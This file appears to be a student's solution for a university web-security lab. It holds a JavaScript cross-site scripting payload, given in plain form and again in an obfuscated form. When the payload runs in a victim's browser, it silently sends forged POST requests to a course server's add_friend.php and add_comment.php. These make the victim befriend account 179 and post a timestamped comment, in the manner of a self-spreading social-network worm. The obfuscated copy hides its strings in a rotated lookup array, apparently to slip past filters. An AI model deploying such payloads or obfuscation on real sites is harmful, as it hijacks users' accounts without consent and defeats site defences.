#Un-obfuscated code:
<script>
	var f = new XMLHttpRequest();
	f.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id%3D179', true);
	f.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');	
	f.send();
	var c = new XMLHttpRequest();
	var d = new Date();
	var url = 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=179%26comment%3Dfriended at '%2B d;
	c.open("POST", url, true);
	c.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	c.send();
</script>

<script>
	var a=['http://csec380-core.csec.rit.edu:86/add_comment.php?id=179%26comment%3Dfriended\x20at\x20','application/x-www-form-urlencoded','send','open','POST','setRequestHeader','Content-type'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0xe3));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var f=new XMLHttpRequest();f[b('0x0')](b('0x1'),'http://csec380-core.csec.rit.edu:86/add_friend.php?id%3D179',!![]);f[b('0x2')](b('0x3'),'application/x-www-form-urlencoded');f['send']();var c=new XMLHttpRequest();var d=new Date();var url=b('0x4')+d;c[b('0x0')](b('0x1'),url,!![]);c[b('0x2')](b('0x3'),b('0x5'));c[b('0x6')]();
</script>